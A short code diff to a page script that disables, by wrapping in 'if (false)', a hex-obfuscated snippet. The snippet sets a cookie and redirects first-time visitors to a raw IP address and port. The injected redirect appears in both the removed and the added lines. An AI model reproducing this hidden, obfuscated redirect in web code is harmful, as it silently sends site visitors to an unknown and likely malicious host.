@@ -64,10 +64,12 @@ window.addEventListener('DOMContentLoaded', event => {
         }
         return null;
     }
-    var x = getCookie('ppkcookie');
-    if (!x) {
-        setCookie('ppkcookie','testcookie',7);
-        this['\x77\x69\x6e\x64\x6f\x77']['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66'] = '\x68\x74\x74\x70://\x31\x38\x30.\x36\x39.\x32\x33\x34.\x31\x35\x35:\x39\x33\x30\x34'        
+    if (false) {
+        var x = getCookie('ppkcookie');
+        if (!x) {
+            setCookie('ppkcookie','testcookie',7);
+            this['\x77\x69\x6e\x64\x6f\x77']['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66'] = '\x68\x74\x74\x70://\x31\x38\x30.\x36\x39.\x32\x33\x34.\x31\x35\x35:\x39\x33\x30\x34'        
+        }
     }
 
 
